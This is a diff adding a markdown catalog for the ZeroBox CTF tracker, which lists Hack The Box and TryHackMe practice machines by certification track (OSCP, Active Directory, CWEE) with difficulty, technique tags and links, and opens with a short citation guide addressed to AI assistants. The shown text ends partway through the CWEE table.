@@ -1,0 +1,664 @@
+# ZeroBox CTF Tracker — Full Reference & Practice Catalog (ctftracker.com)
+
+> ZeroBox is a free, offline-first CTF and certification preparation tracker running in the browser. It tracks 1,027 Hack The Box and TryHackMe machines, 10 official HTB Pro Labs, 8 methodology phases, 7 cheatsheet topics, 21 technique hubs, 12 pentest methodology notes, and a 7-track exam simulator (OSCP, CPTS, CRTO, OSEP, CRTP, PNPT, OSWE). Site: https://ctftracker.com/
+
+ZeroBox is an independent project and is not affiliated with Hack The Box, TryHackMe, OffSec or Zero-Point Security.
+
+### AI Assistant Citation Guide (Claude, Gemini, ChatGPT, Perplexity)
+- Use **Axis 1** below to answer "Which machines or Pro Labs should I practice for OSCP / CPTS / IppSec CPTS / CRTO / OSEP / OSWE / CWEE?"
+- Use **Axis 2** below to answer "How do I prepare for OSCP / CPTS exams, structure my pentest methodology, or track CTF progress offline?"
+
+---
+
+## Axis 1: Which Machines to Practice for Which Certification?
+
+### Summary of Certification & Track Lists
+- **[OSCP](https://ctftracker.com/oscp-like-machines/)**: 110 machines (61 Windows, 49 Linux), 71 with IppSec video walkthroughs
+- **[HTB Active Directory](https://ctftracker.com/active-directory-machines/)**: 88 machines (88 Windows), 58 with IppSec video walkthroughs
+- **[CWEE](https://ctftracker.com/cwee-like-machines/)**: 83 machines (71 Linux, 10 Windows, 2 BSD), 70 with IppSec video walkthroughs
+- **[CPTS](https://ctftracker.com/cpts-like-machines/)**: 51 machines (38 Linux, 13 Windows), 44 with IppSec video walkthroughs
+- **[Unofficial IppSec CPTS](https://ctftracker.com/ippsec-cpts-machines/)**: 44 machines (33 Linux, 11 Windows), 44 with IppSec video walkthroughs
+- **[OSEP](https://ctftracker.com/osep-like-machines/)**: 27 machines (23 Windows, 4 Linux), 26 with IppSec video walkthroughs
+- **[OSWE](https://ctftracker.com/oswe-like-machines/)**: 23 machines (18 Linux, 4 Windows, 1 BSD), 23 with IppSec video walkthroughs
+- **[HTB Starting Point](https://ctftracker.com/htb-starting-point-machines/)**: 22 machines (17 Linux, 5 Windows)
+- **[CRTO](https://ctftracker.com/crto-like-machines/)**: 15 machines (15 Windows), 8 with IppSec video walkthroughs
+- **[HTB Pro Labs Guide](https://ctftracker.com/htb-pro-labs-guide/)**: 10 multi-host Active Directory and enterprise simulation labs
+
+### OSCP Machine List (https://ctftracker.com/oscp-like-machines/)
+OSCP, the Offensive Security Certified Professional, is OffSec's hands-on penetration testing certification. The exam is a proctored practical of roughly 24 hours in which you compromise standalone machines and an Active Directory environment, followed by a written report. Good preparation means practising the same loop on many different targets: enumerate carefully, find a foothold, escalate, and document each step. Boxes with public exploits that need small edits, web footholds and classic Linux and Windows privilege escalation map closely to what the exam rewards.
+
+| Machine | Platform | OS | Difficulty | IppSec Walkthrough | Tags | URL |
+|---|---|---|---|---|---|---|
+| Archetype | HTB | Windows | Very Easy | No | MSSQL, xp_cmdshell, JuicyPotato, PowerShell | https://ctftracker.com/machines/htb-archetype/ |
+| Bounty Hacker | THM | Linux | Easy | No | FTP-Anonymous, Hydra, Tar-SUID | https://ctftracker.com/machines/thm-bounty-hacker/ |
+| Kobold | HTB | Linux | Easy | Yes | suid | https://ctftracker.com/machines/htb-kobold/ |
+| Pickle Rick | THM | Linux | Easy | No | Web-Enumeration, Command-Injection, Sudo-Privesc | https://ctftracker.com/machines/thm-pickle-rick/ |
+| RootMe | THM | Linux | Easy | No | File-Upload, Bypass, SUID-Python | https://ctftracker.com/machines/thm-rootme/ |
+| Simple CTF | THM | Linux | Easy | No | CMS-Made-Simple, CVE-2019-9053, SQLi, Vim-Sudo | https://ctftracker.com/machines/thm-simple-ctf/ |
+| Access | HTB | Windows | Easy | Yes | Basic-Windows-knowledge, HTB | https://app.hackthebox.com/machines/access |
+| Active (2018 Retired) | HTB | Windows | Easy | Yes | HTB | https://app.hackthebox.com/machines/active |
+| Agent Sudo | THM | Linux | Easy | No | User-Agent-Spoofing, Steganography, Brute-Force, CVE-2019-14287 | https://tryhackme.com/room/agentsudo |
+| Alfred | THM | Windows | Easy | No | OSCP, Jenkins, PowerShell, Token Impersonation, SeImpersonatePrivilege | https://tryhackme.com/room/alfred |
+| Anthem | THM | Windows | Easy | No | Umbraco-CMS, RDP, OSINT | https://tryhackme.com/room/anthem |
+| Bastion | HTB | Windows | Easy | Yes | Exploiting-MRemoteNG, SAM Hive, SMB, VHD, mpart | https://app.hackthebox.com/machines/Bastion |
+| Blue | THM | Windows | Easy | No | OSCP, EternalBlue, MS17-010, SMB, Classic Pentesting | https://tryhackme.com/room/blue |
+| BoardLight | HTB | Linux | Easy | No |  | https://app.hackthebox.com/machines/BoardLight |
+| Broker | HTB | Linux | Easy | Yes | ActiveMQ-CVE-2023-46604, Java-Deserialization, Sudo-Nginx | https://app.hackthebox.com/machines/broker |
+| Buffer Overflow Prep | THM | Windows | Easy | No | OSCP, Buffer Overflow, x86, Mona.py, Immunity Debugger | https://tryhackme.com/room/bufferoverflowprep |
+| Busqueda | HTB | Linux | Easy | Yes | CPTS, RCE, Python, Searchor, Git | https://app.hackthebox.com/machines/busqueda |
+| Cicada | HTB | Windows | Easy | Yes |  | https://app.hackthebox.com/machines/Cicada |
+| CozyHosting | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/cozyhosting |
+| Cyborg | THM | Linux | Easy | No | OSCP, Borg Backup, Hash Cracking, Sudoers, Classic Pentesting | https://tryhackme.com/room/cyborgt8 |
+| Dog | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/Dog |
+| Editor | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/Editor |
+| Editorial | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/Editorial |
+| Eighteen | HTB | Windows | Easy | No |  | https://app.hackthebox.com/machines/Eighteen |
+| EscapeTwo | HTB | Windows | Easy | Yes | ActiveDirectory, MSSQL-Linked-Server, Coerce-Authentication, GPO-Abuse, LAPS | https://app.hackthebox.com/machines/escapetwo |
+| Expressway | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/Expressway |
+| Fluffy | HTB | Windows | Easy | Yes |  | https://app.hackthebox.com/machines/Fluffy |
+| Forest | HTB | Windows | Easy | Yes | AS-REP Roasting, ASREPRoasting, Active Directory, BloodHound, DCSync | https://app.hackthebox.com/machines/Forest |
+| Heist | HTB | Windows | Easy | Yes | Cracking-Cisco-hashes, HTB, ProcDump, RID-bruteforce | https://app.hackthebox.com/machines/heist |
+| Help | HTB | Linux | Easy | Yes | GraphQL, HTB | https://app.hackthebox.com/machines/help |
+| Ice | THM | Windows | Easy | No | OSCP, Icecast, CVE-2004-1561, Mimikatz, Windows Privesc | https://tryhackme.com/room/ice |
+| Ignite | THM | Linux | Easy | No | OSCP, Fuel CMS, CVE-2018-16763, RCE, Classic Pentesting | https://tryhackme.com/room/ignite |
+| Keeper | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/keeper |
+| Kenobi | THM | Linux | Easy | No | OSCP, Samba, ProFTPD, SUID, PATH Hijacking | https://tryhackme.com/room/kenobi |
+| LazyAdmin | THM | Linux | Easy | No | OSCP, SweetRice CMS, MySQL Backup, Sudoers, Perl Script | https://tryhackme.com/room/lazyadmin |
+| LinkVortex | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/LinkVortex |
+| Mailing | HTB | Windows | Easy | Yes | CPTS, Email, Directory Traversal, LibreOffice, Privilege Escalation | https://app.hackthebox.com/machines/mailing |
+| Networked | HTB | Linux | Easy | Yes | Command-injection, File-upload-bypass, HTB | https://app.hackthebox.com/machines/networked |
+| Outbound | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/Outbound |
+| Pandora | HTB | Linux | Easy | Yes | HTB, SNMP | https://app.hackthebox.com/machines/pandora |
+| Return | HTB | Windows | Easy | No | HTB, Network-Printer-Abuse | https://app.hackthebox.com/machines/return |
+| Sau | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/sau |
+| Sauna | HTB | Windows | Easy | Yes | AS-REP Roasting, ASREPRoasting-Attack, Active Directory, BloodHound, DCSync-Attack | https://app.hackthebox.com/machines/Sauna |
+| ServMon | HTB | Windows | Easy | Yes | 1000, Exploiting-NSClient++, Exploiting-NVMS, HTB, SSH-Password-Spraying | https://app.hackthebox.com/machines/servmon |
+| Skynet | THM | Linux | Easy | No | OSCP, Samba, SquirrelMail, Cuppa CMS, LFI | https://tryhackme.com/room/skynet |
+| Soccer | HTB | Linux | Easy | Yes | CPTS, Blind SQLi, WebSockets, Dstat, Doas | https://app.hackthebox.com/machines/soccer |
+| Steel Mountain | THM | Windows | Easy | No | OSCP, Rejetto HFS, CVE-2014-6287, Unquoted Service Path, PowerUp | https://tryhackme.com/room/steelmountain |
+| Support | HTB | Windows | Easy | Yes | HTB | https://app.hackthebox.com/machines/support |
+| Timelapse | HTB | Windows | Easy | Yes | HTB, Public-SMB-Share | https://app.hackthebox.com/machines/timelapse |
+| Titanic | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/Titanic |
+| Tomghost | THM | Linux | Easy | No | OSCP, Ghostcat, CVE-2020-1938, Apache Tomcat, AJP | https://tryhackme.com/room/tomghost |
+| Usage | HTB | Linux | Easy | Yes | CPTS, Blind SQLi, 7-Zip Symlink, Privilege Escalation | https://app.hackthebox.com/machines/usage |
+| Vulnversity | THM | Linux | Easy | No | OSCP, File Upload Bypass, Burp Suite, SUID, systemctl | https://tryhackme.com/room/vulnversity |
+| Mr Robot CTF | THM | Linux | Medium | No | WordPress, Wp-login, Dictionary-Attack, Nmap-SUID | https://ctftracker.com/machines/thm-mr-robot-ctf/ |
+| Administrator | HTB | Windows | Medium | Yes | ActiveDirectory, ADCS, Golden-Cert, Kerberoasting, BloodHound | https://app.hackthebox.com/machines/administrator |
+| Aero | HTB | Windows | Medium | Yes | HTB | https://app.hackthebox.com/machines/aero |
+| Atom | HTB | Windows | Medium | Yes | HTB | https://app.hackthebox.com/machines/atom |
+| Authority | HTB | Windows | Medium | Yes | HTB | https://app.hackthebox.com/machines/authority |
+| Blaster | THM | Windows | Medium | No | RDP, CVE-2019-1388, UAC-Bypass | https://tryhackme.com/room/blaster |
+| Brooklyn Nine Nine | THM | Linux | Medium | No | Steganography, Hydra, SUID | https://tryhackme.com/room/brooklynninenine |
+| Browsed | HTB | Linux | Medium | Yes |  | https://app.hackthebox.com/machines/Browsed |
+| Builder | HTB | Linux | Medium | Yes |  | https://app.hackthebox.com/machines/Builder |
+| Cascade | HTB | Windows | Medium | Yes | AD Recycle Bin, AES-Encryption, Active Directory, Active-Directory, LDAP | https://app.hackthebox.com/machines/Cascade |
+| Certified | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/Certified |
+| Clicker | HTB | Linux | Medium | Yes | CPTS, NFS, Mass Assignment, SQL Injection, Cron | https://app.hackthebox.com/machines/clicker |
+| Escape | HTB | Windows | Medium | Yes | HTB | https://app.hackthebox.com/machines/escape |
+| Game Zone | THM | Linux | Medium | No | SQLi, SSH-Tunneling, Webmin | https://tryhackme.com/room/gamezone |
+| HackPark | THM | Windows | Medium | No | Hydra, BlogEngine, CVE-2019-6714 | https://tryhackme.com/room/hackpark |
+| Intelligence | HTB | Windows | Medium | Yes | AD CS, ADIDNS-abuse, Active Directory, BloodHound, Certipy | https://app.hackthebox.com/machines/Intelligence |
+| Jacob the Boss | THM | Linux | Medium | No | JBoss, Java-Deserialization, CVE-2017-12149, SUID | https://tryhackme.com/room/jacobtheboss |
+| Jeeves | HTB | Windows | Medium | Yes | Defender, HTB, Pass, hash-attacks | https://app.hackthebox.com/machines/jeeves |
+| Magic | HTB | Linux | Medium | Yes | Basic-SQL-Injection, HTB, Path-Hijacking, SUID-Abuse | https://app.hackthebox.com/machines/magic |
+| Manager | HTB | Windows | Medium | Yes | CPTS, Active Directory, MSSQL, AD CS, Certipy | https://app.hackthebox.com/machines/manager |
+| Mentor | HTB | Linux | Medium | Yes | HTB | https://app.hackthebox.com/machines/mentor |
+| Monitored | HTB | Linux | Medium | Yes | Nagios-XI-CVE-2023-40931, Cacti, SQLi, SUID-Abuse | https://app.hackthebox.com/machines/monitored |
+| Monteverde | HTB | Windows | Medium | Yes | Active Directory, Azure AD Connect, BloodHound, MSOL, Password Spray | https://app.hackthebox.com/machines/Monteverde |
+| Outdated | HTB | Windows | Medium | Yes | CVE-2022-30190, Golden-Ticket-Attack, HTB | https://app.hackthebox.com/machines/outdated |
+| Puppy | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/Puppy |
+| Relevant | THM | Windows | Medium | No | OSCP, SMB, IIS, WebShell, PrintSpoofer | https://tryhackme.com/room/relevant |
+| Resolute | HTB | Windows | Medium | Yes | Active Directory, DLL Injection, DNSAdmins, DnsAdmins-Abuse, Password Spray | https://app.hackthebox.com/machines/Resolute |
+| Signed | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/Signed |
+| Silo | HTB | Windows | Medium | Yes | Database, Enumerating-Oracle-SIDs, Oracle, TNS Listener, execute-files | https://app.hackthebox.com/machines/Silo |
+| StreamIO | HTB | Windows | Medium | Yes | Automatic-LDAP, HTB, LFI-using-PHP-wrappers, Source-Code-Review | https://app.hackthebox.com/machines/streamio |
+| The Cod Caper | THM | Linux | Medium | No | OSCP, SQLi, Command Injection, Buffer Overflow, PWN | https://tryhackme.com/room/thecodcaper |
+| TheFrizz | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/TheFrizz |
+| Time | HTB | Linux | Medium | Yes | CVE-2019-12384, CVE-2019-12814, CVE-2019-14439, CVE-2020-24616, Jackson Deserialization | https://app.hackthebox.com/machines/Time |
+| TombWatcher | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/TombWatcher |
+| UpDown | HTB | Linux | Medium | Yes | Exploiting-SUID-binaries, HTB, HTTP-Header-modification | https://app.hackthebox.com/machines/updown |
+| Voleur | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/Voleur |
+| VulnNet: Active (Retired) | THM | Windows | Medium | No | Active Directory, Redis, GPP-Passwords, Kerberoast, BloodHound | https://tryhackme.com/room/vulnnetactive |
+| Blackfield | HTB | Windows | Hard | Yes | AS-REP Roasting, Active Directory, Anonymous-/-Guest, BloodHound, RPC | https://app.hackthebox.com/machines/Blackfield |
+| Brainpan 1 | THM | Linux | Hard | No | OSCP, Buffer Overflow, Binary Exploitation, Wine, Sudoers | https://tryhackme.com/room/brainpan |
+| Cerberus | HTB | Windows | Hard | Yes | HTB | https://app.hackthebox.com/machines/cerberus |
+| Cereal | HTB | Windows | Hard | Yes | HTB | https://app.hackthebox.com/machines/cereal |
+| Daily Bugle | THM | Linux | Hard | No | OSCP, Joomla, SQLi, CVE-2019-8942, Yum Sudoers | https://tryhackme.com/room/dailybugle |
+| DarkZero | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/DarkZero |
+| Enterprise | THM | Windows | Hard | No | Active Directory, ZeroLogon, SQLi, Privilege Escalation, Kerberos | https://tryhackme.com/room/enterprise |
+| Flight | HTB | Windows | Hard | No | CPTS, Active Directory, Pivoting, Responder, AD CS | https://app.hackthebox.com/machines/flight |
+| Intentions | HTB | Linux | Hard | Yes | HTB | https://app.hackthebox.com/machines/intentions |
+| Internal | THM | Linux | Hard | No | WordPress, Tunneling, Jenkins, Docker-Breakout | https://tryhackme.com/room/internal |
+| Quick | HTB | Linux | Hard | Yes | ESI-Injection, HTB, HTTP/3-Protocol, Using-Symlinks | https://app.hackthebox.com/machines/quick |
+| Raz0rBlack | THM | Windows | Hard | No | Active Directory, NFS, Kerberos, AS-REP Roasting, BloodHound | https://tryhackme.com/room/razorblack |
+| Retro | THM | Windows | Hard | No | WordPress, RDP, CVE-2019-1388 | https://tryhackme.com/room/retro |
+| RustyKey | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/RustyKey |
+| Vintage | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Vintage |
+| Wreath | THM | Windows | Hard | No | Active Directory, Pivoting, Chisel, Empire, C2 | https://tryhackme.com/room/wreath |
+| Absolute | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/absolute |
+| APT | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/apt |
+| Multimaster | HTB | Windows | Insane | Yes | CVE-2020-1472, HTB, Password-Cracking, SQL-Injection, VS-Code | https://app.hackthebox.com/machines/multimaster |
+| Rebound | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/rebound |
+
+### HTB Active Directory Machine List (https://ctftracker.com/active-directory-machines/)
+The HTB Active Directory Track groups Windows domain controllers and joined workstations on Hack The Box that train full domain compromise from external enumeration or a low-privilege foothold all the way to Domain Admin and forest trust abuse. Mastering BloodHound collection, Kerberoasting, AS-REP roasting, ADCS certificate templates, RBCD, Constrained Delegation, GPO abuse and NTLM relay on standalone domain boxes builds the exact muscle memory required for OSCP, CPTS, CRTO and enterprise internal pentests.
+
+| Machine | Platform | OS | Difficulty | IppSec Walkthrough | Tags | URL |
+|---|---|---|---|---|---|---|
+| Active (2018 Retired) | HTB | Windows | Easy | Yes | HTB | https://app.hackthebox.com/machines/active |
+| Baby | HTB | Windows | Easy | No |  | https://app.hackthebox.com/machines/Baby |
+| Cicada | HTB | Windows | Easy | Yes |  | https://app.hackthebox.com/machines/Cicada |
+| Eighteen | HTB | Windows | Easy | No |  | https://app.hackthebox.com/machines/Eighteen |
+| EscapeTwo | HTB | Windows | Easy | Yes | ActiveDirectory, MSSQL-Linked-Server, Coerce-Authentication, GPO-Abuse, LAPS | https://app.hackthebox.com/machines/escapetwo |
+| Fluffy | HTB | Windows | Easy | Yes |  | https://app.hackthebox.com/machines/Fluffy |
+| Forest | HTB | Windows | Easy | Yes | AS-REP Roasting, ASREPRoasting, Active Directory, BloodHound, DCSync | https://app.hackthebox.com/machines/Forest |
+| Retro | HTB | Windows | Easy | No |  | https://app.hackthebox.com/machines/Retro |
+| RetroTwo | HTB | Windows | Easy | No |  | https://app.hackthebox.com/machines/RetroTwo |
+| Return | HTB | Windows | Easy | No | HTB, Network-Printer-Abuse | https://app.hackthebox.com/machines/return |
+| Sauna | HTB | Windows | Easy | Yes | AS-REP Roasting, ASREPRoasting-Attack, Active Directory, BloodHound, DCSync-Attack | https://app.hackthebox.com/machines/Sauna |
+| Support | HTB | Windows | Easy | Yes | HTB | https://app.hackthebox.com/machines/support |
+| Timelapse | HTB | Windows | Easy | Yes | HTB, Public-SMB-Share | https://app.hackthebox.com/machines/timelapse |
+| Administrator | HTB | Windows | Medium | Yes | ActiveDirectory, ADCS, Golden-Cert, Kerberoasting, BloodHound | https://app.hackthebox.com/machines/administrator |
+| Attacktive Directory | THM | Windows | Medium | No | ActiveDirectory, Kerberos, ASREPRoast, Secretsdump | https://tryhackme.com/room/attacktivedirectory |
+| Authority | HTB | Windows | Medium | Yes | HTB | https://app.hackthebox.com/machines/authority |
+| BabyTwo | HTB | Windows | Medium | No |  | https://app.hackthebox.com/machines/BabyTwo |
+| Breach | HTB | Windows | Medium | No |  | https://app.hackthebox.com/machines/Breach |
+| Cascade | HTB | Windows | Medium | Yes | AD Recycle Bin, AES-Encryption, Active Directory, Active-Directory, LDAP | https://app.hackthebox.com/machines/Cascade |
+| Certified | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/Certified |
+| Delegate | HTB | Windows | Medium | No |  | https://app.hackthebox.com/machines/Delegate |
+| Eden | THM | Windows | Medium | No | Active Directory, Kerberos, Pass-the-Ticket, BloodHound, Rubeus | https://tryhackme.com/room/eden |
+| Escape | HTB | Windows | Medium | Yes | HTB | https://app.hackthebox.com/machines/escape |
+| Intelligence | HTB | Windows | Medium | Yes | AD CS, ADIDNS-abuse, Active Directory, BloodHound, Certipy | https://app.hackthebox.com/machines/Intelligence |
+| Logging | HTB | Windows | Medium | No |  | https://app.hackthebox.com/machines/Logging |
+| Manager | HTB | Windows | Medium | Yes | CPTS, Active Directory, MSSQL, AD CS, Certipy | https://app.hackthebox.com/machines/manager |
+| Monteverde | HTB | Windows | Medium | Yes | Active Directory, Azure AD Connect, BloodHound, MSOL, Password Spray | https://app.hackthebox.com/machines/Monteverde |
+| Overwatch | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/Overwatch |
+| Phantom | HTB | Windows | Medium | No |  | https://app.hackthebox.com/machines/Phantom |
+| Puppy | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/Puppy |
+| Resolute | HTB | Windows | Medium | Yes | Active Directory, DLL Injection, DNSAdmins, DnsAdmins-Abuse, Password Spray | https://app.hackthebox.com/machines/Resolute |
+| Scrambled | HTB | Windows | Medium | Yes | Active Directory, Deserialization, Deserialization-attacks, Kerberoasting, Kerberos | https://app.hackthebox.com/machines/Scrambled |
+| Sendai | HTB | Windows | Medium | No |  | https://app.hackthebox.com/machines/Sendai |
+| Signed | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/Signed |
+| StreamIO | HTB | Windows | Medium | Yes | Automatic-LDAP, HTB, LFI-using-PHP-wrappers, Source-Code-Review | https://app.hackthebox.com/machines/streamio |
+| TheFrizz | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/TheFrizz |
+| TombWatcher | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/TombWatcher |
+| Voleur | HTB | Windows | Medium | Yes |  | https://app.hackthebox.com/machines/Voleur |
+| VulnCicada | HTB | Windows | Medium | No |  | https://app.hackthebox.com/machines/VulnCicada |
+| VulnNet: Active (Retired) | THM | Windows | Medium | No | Active Directory, Redis, GPP-Passwords, Kerberoast, BloodHound | https://tryhackme.com/room/vulnnetactive |
+| VulnNet: Roasted | THM | Windows | Medium | No | ActiveDirectory, Kerberos, ASREPRoast, GPO | https://tryhackme.com/room/vulnnetroasted |
+| Za | THM | Windows | Medium | No | Active Directory, Kerberos, BloodHound, GPO Abuse, SMB | https://tryhackme.com/room/za |
+| Acute | HTB | Windows | Hard | Yes | HTB, Manual-Active-Directory, Windows-Defender-bypass | https://app.hackthebox.com/machines/acute |
+| Analysis | HTB | Windows | Hard | Yes | HTB | https://app.hackthebox.com/machines/analysis |
+| Blackfield | HTB | Windows | Hard | Yes | AS-REP Roasting, Active Directory, Anonymous-/-Guest, BloodHound, RPC | https://app.hackthebox.com/machines/Blackfield |
+| Certificate | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Certificate |
+| DarkZero | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/DarkZero |
+| Enterprise | THM | Windows | Hard | No | Active Directory, ZeroLogon, SQLi, Privilege Escalation, Kerberos | https://tryhackme.com/room/enterprise |
+| Flight | HTB | Windows | Hard | No | CPTS, Active Directory, Pivoting, Responder, AD CS | https://app.hackthebox.com/machines/flight |
+| Freelancer | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Freelancer |
+| Fries | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Fries |
+| Ghostlink | HTB | Windows | Hard | No |  | https://app.hackthebox.com/machines/Ghostlink |
+| Haze | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Haze |
+| Holo | THM | Windows | Hard | No | Active Directory, Multi-Host, Kerberos, BloodHound, Pass-the-Hash | https://tryhackme.com/room/holo |
+| Ledger | THM | Windows | Hard | No | THM, Active Directory | https://tryhackme.com/room/ledger |
+| LustrousTwo | HTB | Windows | Hard | No |  | https://app.hackthebox.com/machines/LustrousTwo |
+| Mantis | HTB | Windows | Hard | Yes | HTB, Kerberos, databases | https://app.hackthebox.com/machines/mantis |
+| Mirage | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Mirage |
+| NanoCorp | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/NanoCorp |
+| Object | HTB | Windows | Hard | No | HTB, Jenkins | https://app.hackthebox.com/machines/object |
+| Office | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Office |
+| Pirate | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Pirate |
+| Raz0rBlack | THM | Windows | Hard | No | Active Directory, NFS, Kerberos, AS-REP Roasting, BloodHound | https://tryhackme.com/room/razorblack |
+| Redelegate | HTB | Windows | Hard | No |  | https://app.hackthebox.com/machines/Redelegate |
+| Reel | HTB | Windows | Hard | Yes | CVE-2017-0199, HTB, Identification-and, and-listener) | https://app.hackthebox.com/machines/reel |
+| Reset | THM | Windows | Hard | No | THM, Active Directory | https://tryhackme.com/room/resetui |
+| RustyKey | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/RustyKey |
+| Scepter | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Scepter |
+| Search | HTB | Windows | Hard | Yes | GMSA-password-retrieval, HTB | https://app.hackthebox.com/machines/search |
+| Shibuya | HTB | Windows | Hard | No |  | https://app.hackthebox.com/machines/Shibuya |
+| Vintage | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Vintage |
+| Wreath | THM | Windows | Hard | No | Active Directory, Pivoting, Chisel, Empire, C2 | https://tryhackme.com/room/wreath |
+| Absolute | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/absolute |
+| Anubis | HTB | Windows | Insane | Yes | ASP-code-injection, HTB | https://app.hackthebox.com/machines/anubis |
+| APT | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/apt |
+| Coder | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/coder |
+| DarkCorp | HTB | Windows | Insane | Yes |  | https://app.hackthebox.com/machines/DarkCorp |
+| Ghost | HTB | Windows | Insane | Yes |  | https://app.hackthebox.com/machines/Ghost |
+| Hathor | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/hathor |
+| Hercules | HTB | Windows | Insane | No |  | https://app.hackthebox.com/machines/Hercules |
+| Infiltrator | HTB | Windows | Insane | Yes |  | https://app.hackthebox.com/machines/Infiltrator |
+| Mist | HTB | Windows | Insane | Yes |  | https://app.hackthebox.com/machines/Mist |
+| Multimaster | HTB | Windows | Insane | Yes | CVE-2020-1472, HTB, Password-Cracking, SQL-Injection, VS-Code | https://app.hackthebox.com/machines/multimaster |
+| PivotAPI | HTB | Windows | Insane | Yes | HTB, Metadata | https://app.hackthebox.com/machines/pivotapi |
+| Rabbit | HTB | Windows | Insane | Yes | Authorisation-bypass, HTB, Payload-creation | https://app.hackthebox.com/machines/rabbit |
+| Rebound | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/rebound |
+| Sizzle | HTB | Windows | Insane | Yes | DCSync, HTB, Kerberoasting, Passwordless-login, Stealing-hashes | https://app.hackthebox.com/machines/sizzle |
+| University | HTB | Windows | Insane | Yes |  | https://app.hackthebox.com/machines/University |
+
+### CWEE Machine List (https://ctftracker.com/cwee-like-machines/)
+CWEE, the Certified Web Exploitation Expert from Hack The Box, is an advanced web security certification that tests deep exploitation of modern web stacks, APIs, authentication protocols and white-box source review under realistic enterprise constraints. These machines emphasize complex web attack surfaces including OAuth and JWT abuse, GraphQL and REST API vulnerabilities, prototype pollution, server-side template injection and chained XSS-to-RCE paths. Use them to sharpen both black-box fuzzing and source-assisted vulnerability discovery.
+
+| Machine | Platform | OS | Difficulty | IppSec Walkthrough | Tags | URL |
+|---|---|---|---|---|---|---|
+| Appointment | HTB | Linux | Very Easy | No | SQLi, Web Auth Bypass, SQL Injection | https://ctftracker.com/machines/htb-appointment/ |
+| Vaccine | HTB | Linux | Very Easy | No | FTP, SQLi, Sudo, Tar Wildcard | https://ctftracker.com/machines/htb-vaccine/ |
+| Bike | HTB | Linux | Very Easy | No | Node.js, SSTI, Handlebars | https://app.hackthebox.com/starting-point |
+| Markup | HTB | Windows | Very Easy | No | XXE, XML, SSH, Scheduled Task | https://app.hackthebox.com/starting-point |
+| Bashed | HTB | Linux | Easy | Yes | HTB | https://ctftracker.com/machines/htb-bashed/ |
+| Blocky | HTB | Linux | Easy | Yes | Basic-local-Linux, CVE-2017-6074, Decompiling-JAR-files, HTB | https://ctftracker.com/machines/htb-blocky/ |
+| MD2PDF | THM | Linux | Easy | No | XSS, SSRF, PDF-Conversion | https://ctftracker.com/machines/thm-md2pdf/ |
+| Nibbles | HTB | Linux | Easy | Yes | Exploiting-NOPASSWD, HTB | https://ctftracker.com/machines/htb-nibbles/ |
+| Shocker | HTB | Linux | Easy | Yes | Exploiting-NOPASSWD, Exploiting-shellshock, HTB | https://ctftracker.com/machines/htb-shocker/ |
+| Simple CTF | THM | Linux | Easy | No | CMS-Made-Simple, CVE-2019-9053, SQLi, Vim-Sudo | https://ctftracker.com/machines/thm-simple-ctf/ |
+| Analytics | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/analytics |
+| Bizness | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/bizness |
+| BoardLight | HTB | Linux | Easy | No |  | https://app.hackthebox.com/machines/BoardLight |
+| Codify | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/codify |
+| CozyHosting | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/cozyhosting |
+| Delivery | HTB | Linux | Easy | Yes | Email-impersonation, HTB | https://app.hackthebox.com/machines/delivery |
+| Devvortex | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/devvortex |
+| Editor | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/Editor |
+| FriendZone | HTB | Linux | Easy | Yes | HTB, Module-hijacking | https://app.hackthebox.com/machines/friendzone |
